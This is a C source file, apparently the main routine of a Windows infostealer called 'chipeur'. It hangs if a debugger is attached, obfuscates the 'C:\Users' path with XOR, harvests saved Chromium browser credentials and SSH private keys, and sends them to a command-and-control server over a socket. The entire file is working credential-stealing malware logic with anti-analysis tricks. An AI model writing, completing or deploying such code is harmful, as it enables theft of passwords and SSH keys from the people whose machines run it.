#include "chipeur.h"

#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <windows.h>
#include <winsock2.h>

#include "c2.h"
#include "chromium.h"
#include "find_ssh_key.h"
#include "logins.h"
#include "obfuscation.h"

int main(void) {
#ifdef DEBUG
  // Puts the console in UTF-8
  // Allows us to print non-ASCII characters for debug
  SetConsoleOutputCP(CP_UTF8);
#endif

  // Check if a debugger is attached to the process
  BOOL isDebuggerPresent = FALSE;
  HANDLE hProcess = GetCurrentProcess();

  if (CheckRemoteDebuggerPresent(hProcess, &isDebuggerPresent)) {
    if (isDebuggerPresent) {
#ifdef DEBUG
      printf("Debug program detected on the process.\n");
#endif
      while (1);
    } else {
#ifdef DEBUG
      printf("No debug process detected on the process\n");
#endif
    }
  } else {
#ifdef DEBUG
    printf("DEBUG: main: CheckRemoteDebuggerPresent failed. Error : %lu\n",
           GetLastError());
#endif
  }

  Credential credTab[CRED_SIZE] = {0};
  DWORD32 lenCredTab = 0;
  sshKey keysFilenamesTab[MAX_KEY_FILES] = {0};
  DWORD32 lenKeysTab = 0;

  steal_chromium_creds(credTab, &lenCredTab);
  wchar_t users_path[] = L"\x69\x10\x76\x7f\x59\x4f\x58\x59";  // C:\Users
  XOR_STR(users_path, 8);
  find_ssh_key(users_path, keysFilenamesTab, &lenKeysTab);

  for (int i = 0; i < lenCredTab; i++) {
    printCredential(credTab[i]);
  }

  SOCKET sock;
  BOOL success = connect_to_c2(&sock);
  if (success == 0) {
    exit(-1);
  }

  success = send_ssh_key(keysFilenamesTab, lenKeysTab, &sock);
#ifdef DEBUG
  if (success) {
    printf("DEBUG: main: Info, ssh keys sent with success\n");
  }
#endif
  success = send_credentials(&sock, credTab, lenCredTab);
#ifdef DEBUG
  if (success) {
    printf("DEBUG: main: Info, creds sent with success\n");
  }
#endif
  return EXIT_SUCCESS;
}
